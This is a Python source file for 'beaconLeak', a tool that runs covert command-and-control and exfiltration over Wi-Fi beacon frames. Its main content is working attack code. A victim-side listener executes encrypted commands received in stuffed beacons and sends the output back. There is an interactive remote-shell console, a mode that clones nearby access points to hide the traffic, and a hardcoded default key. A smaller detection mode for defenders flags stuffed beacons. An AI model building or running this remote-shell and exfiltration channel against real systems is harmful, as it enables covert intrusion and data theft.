#!/usr/bin/python
#
"""
 _                       __            _
| |_ ___ ___ ___ ___ ___|  |   ___ ___| |_
| . | -_| .'|  _| . |   |  |__| -_| .'| '_|
|___|___|__,|___|___|_|_|_____|___|__,|_,_|
                        by cjcase [v0.8.90]

beaconLeak - Covert data exfiltration and detection using beacon stuffing (🥓)
"""
import os
import sys
import time
import shlex
import syslog
import hashlib
import subprocess

import nacl.utils
import nacl.secret
import nacl.pwhash

from scapy.all import Dot11
from scapy.all import Dot11Beacon
from scapy.all import Dot11Elt
from scapy.all import RadioTap
from scapy.all import sniff
from scapy.all import sendp
from scapy.all import srp1
from scapy.all import hexdump


class beaconleak():
    def __init__(self, mode, iface, psk=None, ssid=None, bssid=None, 
        covert=False, delay=5, debug=False, **kwargs):
        # mode selection
        self.mode = mode
        # sniffing interface
        self.iface = iface
        # output response delay
        self.delay = delay
        # covert
        self.covert = covert
        self.covert_frame = None
        self.beacons = {}
        # IEEE Std 802.11™-2016. Table 9-77, Element IDs. p.784-790
        # Wireshark acknowledges Tag ID 47 as ERP Information
        self.reserved = [2, 8, 9] + [*range(17,32)] + [49, 128, 129] + [*range(133, 137)] + [149, 150, 155, 156, 173, 176] + [*range(178, 181)] + [203] + [*range(207,221)] + [*range(222, 255)]
        # c2 commands
        self.shell_cmds = {
            '!help': 'print these commands',
            # TODO download file flow
            #'!download': 'downloads file from target',
            #'!reset': 'resets own session and broadcasts session reset command',
            #'!upload': 'uploads file to target',
            '!': 'send command to target without waiting for response (e.g. !ls)',
            '!end': 'exit beaconshell',
        }
        # science
        self.detected = 0
        # user set
        self.debug = debug
        # crypto magic
        self.session = 0 # TODO crypto session/replay
        self.salt = b'beaconleak::salt' # TODO crypto session/replay
        if not psk:
            self.psk = bytes.fromhex('299e29a4d36990bc479d6fed6551a94c7e3da6e10c8cdf9bab9e3c18a04ddee8')
        else:
            self.psk = nacl.pwhash.argon2i.kdf(32, psk.encode('utf-8'), self.salt)
        self.box = nacl.secret.SecretBox(self.psk)
        # custom beacon
        self.ssid = ssid
        if not ssid:
            self.ssid = 'linksys'
        self.bssid = bssid
        if not bssid:
            self.bssid = '00:14:bf:de:ad:c0'
        # TODO check beacon size and do covert element 221 stuffing
        self.marker = b'\x0b\x33'

    def cmd(self, cmd):
        if sys.platform == 'linux':
            args = shlex.split(cmd)
            result = subprocess.check_output(args)
        else:
            result = subprocess.check_output(cmd, shell=True)
        return result

    def stuff_bytes(self, file):
        # called as victim, this will read a file, send its contents in the 
        # beacon.
        # TODO finish this dude.
        file_size = None
        with open(file, 'rb+') as f:
            pass
            


    def beacon_craft(self, msg):
        # general case
        # TODO add type/structure definition to class
        _type = Dot11Elt(ID=253, info='\x01', len=1) # DEPRECATED: c2 type
        _stuff = Dot11Elt(ID=254, info=msg, len=len(msg))
        if not self.covert:
            rates = b'\x82\x84\x0b\x16'
            rsninfo = (
                b'\x01\x00'          # RSN Version 1
                b'\x00\x0f\xac\x04'  # Group Cipher Suite : 00-0f-ac CCMP
                b'\x01\x00'          # 1 Pairwise Cipher Suite
                b'\x00\x0f\xac\x04'  # AES Cipher CCMP
                b'\x01\x00'          # 1 Authentication Key Managment Suite:
                b'\x00\x0f\xac\x02'  # Pre-Shared Key
                b'\x0c\x00'          # RSN Capabilities
            )
            dot11 = Dot11(
                type=0,
                subtype=8,
                addr1='ff:ff:ff:ff:ff:ff',
                addr2=self.bssid,
                addr3=self.bssid
            )
            beacon = Dot11Beacon(
                cap='ESS+privacy',
                timestamp=int(time.time())
            )
            _ssid = Dot11Elt(ID='SSID', info=self.ssid, len=len(self.ssid))
            _rsninfo = Dot11Elt(ID='RSNinfo', info=rsninfo, len=len(rsninfo))
            _rates = Dot11Elt(ID="Rates", info=rates, len=len(rates))
            frame = RadioTap() / dot11 / beacon / _ssid / _rates / _rsninfo / _stuff
        else:
            # TODO check beacon size and do covert element 221 stuffing
            frame = self.covert_frame / _stuff
        return frame
        
    def push_cmd(self, cmd, reply=True):
        # TODO: implement leak mode with extra measurements
        try:
            if self.debug:
                print("[d] command: {}".format(cmd))
            msg = cmd.encode()
            msg_e = self.box.encrypt(msg)
            if self.debug:
                print("[d] encrypted: {}".format(msg_e.hex()))

            # craft the frame
            frame = self.beacon_craft(msg_e)

            # TODO: optional bpf filtering
            # bpf = 'wlan addr2 %s' % bssid
            if self.debug:
                print("[d] scapy frame:\n{}".format(frame.command()))
                # print("[d] sniff filter:\n{}".format(bpf))
            sendp(frame, iface=self.iface, inter=0.100, loop=0, verbose=int(self.debug))
            if reply:
                sniff(iface=self.iface, stop_filter=self.response, timeout=self.delay, monitor=True)
        except Exception as e:
            if self.debug:
                print("[d] error:\n{}".format(str(e)))

    def c2(self):
        # covert mode
        if self.covert and not self.covert_frame:
            self.sneaky()
        print("[*] Using interface {}, type '!help' for usage, use Ctrl+C to exit".format(self.iface))
        if self.check_iface():
            while True:
                try:
                    # TODO: nice-to-have: color output to terminal (interoperable)
                    cmd = input("[beaconshell] >>> ") 
                except KeyboardInterrupt:
                    print("\n[*] Done!")
                    break
                except Exception as e:
                    print("[e] Something failed: " + str(e))
                    continue
                if cmd == '':
                    continue
                # TODO: implement interactive commands for extra c2 functions
                try:
                    if cmd == '!help':
                        for c, desc in self.shell_cmds.items():
                            print("\t{}: {}".format(c, desc))
                        print()
                    elif cmd[0] == '!':
                        cmd = cmd[1:]                    
                        cmd = cmd.split()
                        if cmd[0] == 'download':
                            # TODO download flow
                            pass
                        elif cmd[0] == 'end':
                            print("\n[*] Done!")
                            break
                        else:
                            self.push_cmd(" ".join(cmd), reply=False)
                    else:
                        self.push_cmd(cmd)
                except Exception as e:
                    print("error in command!")
                    if self.debug:
                        print(str(e))
                    continue


    def response(self, frame):
        # TODO: implement covert logic
        if frame.haslayer(Dot11Beacon):
            if frame.addr2 == self.bssid:
                i = 0
                elements = frame
                while elements:
                    # TODO fix error here, 128 is only a marker, must extract response from 254
                    if elements.ID == 128:
                        elements = elements.payload
                        if self.debug:
                            print("[d] response frame:\n{}".format(frame.command()))
                            print("[d] received:{}".format(elements.info.hex()))
                        msg = self.dec_payload(elements.info)
                        print(msg)
                        break
                    i = i + 1
                    elements = elements.payload
  

    def dec_payload(self, enc):
        c = ''
        if self.debug:
            print("[d] received:{}".format(enc.hex()))
        try:
            c = self.box.decrypt(enc).decode('utf-8')
            if self.debug:
                print("[d] decrypted: {}".format(c))
        except Exception as e:
            c = "[e] Could not decrypt, wrong PSK or error in received beacon!"
            if self.debug:
                print("[e] Could not decrypt, wrong PSK or error in received beacon!")
                print("[e] " + str(e))
        return c


    def do_magic(self, frame, cut):
        if self.debug:
            print("[d] stuffed beacon at element in position {}:\n{}".format(cut, frame.command()))
        crypted = frame[Dot11Elt][cut].info
        c = self.dec_payload(crypted)
        if c:
            try:
                result = self.cmd(c.decode('utf-8'))
            except Exception as e:
                result = b"[e] Command failed"
                if self.debug:
                    print("[d] Command Failed:\n" + str(e))
            if self.debug:
                print("[d] Command Result:\n{}".format(result.decode('utf-8')))
            result_e = self.box.encrypt(result)
            frame[Dot11Elt][cut] = Dot11Elt(ID=128, info=b'\x01', len=1) / Dot11Elt(ID=254, info=result_e, len=len(result_e))
            if self.debug:
                print("[d] sending:{}".format(result_e.hex()))
                print("[d] response frame:\n{}".format(frame.command()))
            time.sleep(2)
            sendp(frame, iface=self.iface, verbose=int(self.debug))

    # TODO stuff element 221 for maximum lulz
    def magic(self, frame):
        if frame.haslayer(Dot11Beacon):
            # TODO add option for known bssid or delete option from arguments
            i = 0
            elements = frame
            while elements:
                if elements.ID == 128:
                    break
                if elements.ID == 254:
                    self.do_magic(frame, i)
                    break
                i = i + 1
                elements = elements.payload
               

    def sniff(self, pcap=False):
        iface = self.iface
        try:
            if self.mode == "leak":
                if self.debug:
                    print("[*] Starting command listener in debug mode")
                sniff(iface=iface, prn=self.magic, monitor=True)
            elif self.mode == "mon":
                if pcap:
                    print("[*] Starting offline capture analysis")
                    sniff(offline=pcap, prn=self.detect)
                else:
                    print("[*] Starting live monitoring mode, press Ctrl+C to stop...")
                    sniff(iface=iface, prn=self.detect, monitor=True)
        except KeyboardInterrupt:
            print("\n[*] Done!")
        #except Exception as e:
        #    print("[e] Error occurred while sniffing.")
        #    if self.debug:
        #        print("[d] error: {}".format(str(e)))
        

    def clone(self, frame):
        if frame.haslayer(Dot11Beacon):
            try:
                extra = frame.notdecoded
                rssi = -(256 - ord(extra[-4:-3]))
            except Exception:
                rssi = -100
            self.beacons[frame.addr2] = (rssi, frame)

    # this one is 1337
    def sneaky(self):
        print("[*] Covert mode enabled:")
        # sniff frames around me
        print("[i] Probing for 10 seconds surrounding beacons...")
        sniff(iface=self.iface, prn=self.clone, count=20, timeout=10)
        # choose closer one
        print("[i] Checking results:")
        check = -101
        best = [0]
        for bssid, val in self.beacons.items():
            rssi, frame = val
            if rssi > check:
                check = rssi
                best.pop()
                best.append(frame)
            print("\t{} | {} | {}".format(frame.info.decode('utf-8'), bssid, rssi))
        # imitate it
        best_frame = best.pop()
        # edge cases
        if best_frame == 0:
            if not self.beacons:
                print("[i] No beacons found on this channel, proceeding with defaults")
                self.covert = False
                return
            else:
                discard, best_frame = self.beacons.popitem()
        print("[i] Cloning {}({} dBm)".format(best_frame.info.decode('utf-8'), check))
        if self.debug:
            print("[d] frame:\n{}".format(best_frame.command()))
        self.covert_frame = best_frame
        self.ssid = best_frame.info.decode('utf-8')
        self.bssid = best_frame.addr2

    # this is for the blue teamers
    # IoC detection from simple test to complex test
    def detect(self, frame):
        if frame.haslayer(Dot11Beacon):
            ssid = frame.info.decode('utf-8')
            elements = frame.getlayer(Dot11Elt)
            # TODO add MAC Adress validation detection case            
            # IoC: pyExfil defaults
            if frame.addr2 == "00:00:00:00:00:42" or ssid == "pyExfil":
                print("[!] Beacon Stuffing Detected! (SSID:{}, PyExfil Defaults)".format(ssid))
                self.detected += 1
                return
            # IoC: beaconLeak defaults
            if frame.addr2 == "00:14:bf:de:ad:c0":
                print("[!] Beacon Stuffing Detected! (SSID:{}, beaconLeak Defaults)".format(ssid))
                self.detected += 1
                return
            # IoC: Beacon size sample std. dev.
            l_tresh = 175 # these numbers were made with 
            h_tresh = 352 # SCIENCE!
            l_frame = len(frame)
            if l_frame < l_tresh or l_frame > h_tresh:
                print("[!] Beacon Stuffing Detected! (SSID:{}, Beacon Size Treshold)".format(ssid))
                self.detected += 1
                return
            while elements:
                # IoC: Reserved Elements
                if elements.ID in self.reserved:
                    # TODO: implement syslog functionality for IoCs
                    print("[!] Beacon Stuffing Detected! (SSID:{} Reserved Element {})".format(ssid, elements.ID))
                    self.detected += 1
                    if self.debug:
                        print("[{}] Data: {}".format(self.detected, elements.info.hex()))
                elements = elements.payload.getlayer(Dot11Elt)


    def check_iface(self):
        try:
            sniff(iface=self.iface, count=1)
        except OSError:
            print("[e] interface {i} not found, did you mean {i}mon?".format(i=self.iface))
            return False
        except Exception:
            return False
        return True


if __name__ == '__main__':
    import argparse
    banner = """
     _                       __            _
    | |_ ___ ___ ___ ___ ___|  |   ___ ___| |_
    | . | -_| .'|  _| . |   |  |__| -_| .'| '_|
    |___|___|__,|___|___|_|_|_____|___|__,|_,_|
                            by cjcase [v0.8.90]\n
    """
    parse = argparse.ArgumentParser(add_help=True, formatter_class=argparse.RawTextHelpFormatter, description=banner)
    modes = parse.add_argument_group('modes')
    mutex = modes.add_mutually_exclusive_group(required=True)
    mutex.add_argument(
        '--leak', 
        help='(target) Leak data mode.',
        action='store_true'
    )
    mutex.add_argument(
        '--detect',
        help='(detect) Check surroundings for possible attacks',
        action='store_true'
    )
    mutex.add_argument(
        '--c2',
        help='(attack) Command & control, remote shell',
        action='store_true'
    )

    # arguments per mode
    detect_opts = parse.add_argument_group('detection mode options')
    c2_opts = parse.add_argument_group('c2 and leak mode options')

    # detection mode options
    detect_opts.add_argument('--pcap', 
        nargs='+',
        help='pcap file(s) for offline beacon analysis'
    )
    detect_opts.add_argument('--autohop',
        help='(Linux only) Automatic channel hopping',
        action='store_true'
    )
    detect_opts.add_argument('--loglevel', help='log level, lowest is critical') # TODO
    
    # c2 mode options
    c2_opts.add_argument('--covert',
        help='Be extra sneaky by mimicking surrounding beacons',
        action='store_true'
    )
    c2_opts.add_argument('--psk', help='Custom encryption passphrase')
    c2_opts.add_argument('--ssid', 
        help='Emulated station WiFi name',
        default='linksys'
    )
    c2_opts.add_argument('--bssid', 
        help='Emulated station MAC address',
        default='00:14:bf:de:ad:c0'
    )
    c2_opts.add_argument('--delay',
        type=lambda x: int(x) if x and x.isdigit() else None,
        default=5,
        help='delay to sniff for command output response [default=5]'
    )

    # general options
    parse.add_argument('--debug', help='Debug verbosity.', action='store_true')

    # monitor interface
    parse.add_argument('iface', help='Wireless interface in monitor mode')
    args = parse.parse_args()

    # leak mode
    if args.leak:
        if args.debug:
            print(banner)
        bl = beaconleak('leak', args.iface, psk=args.psk, debug=args.debug)
        bl.sniff()
    # c2 mode
    elif args.c2:
        print(banner)
        if args.psk:
            print("[*] Using custom key, set up leaker to use it too.")
            #print("[*] Salt: {}".format(self.salt.hex())) # TODO
        # chunky boi
        bl = beaconleak('c2', args.iface, 
            psk=args.psk, 
            ssid=args.ssid,
            bssid=args.bssid,
            delay=args.delay,
            covert=args.covert,
            debug=args.debug
        )
        bl.c2()
    # detect mode
    elif args.detect:
        bl = beaconleak('mon', args.iface, debug=args.debug)
        print(banner)
        # linux auto hop
        if args.autohop:
            if sys.platform == 'linux':
                print("[i] channel auto-hop enabled, detection accuracy might decrease")
                # TODO implement subprocess fork to iterate through channels
            else:
                print("[i] channel auto-hop is not supported on {}".format(sys.platform))
        bl.sniff(pcap=args.pcap)
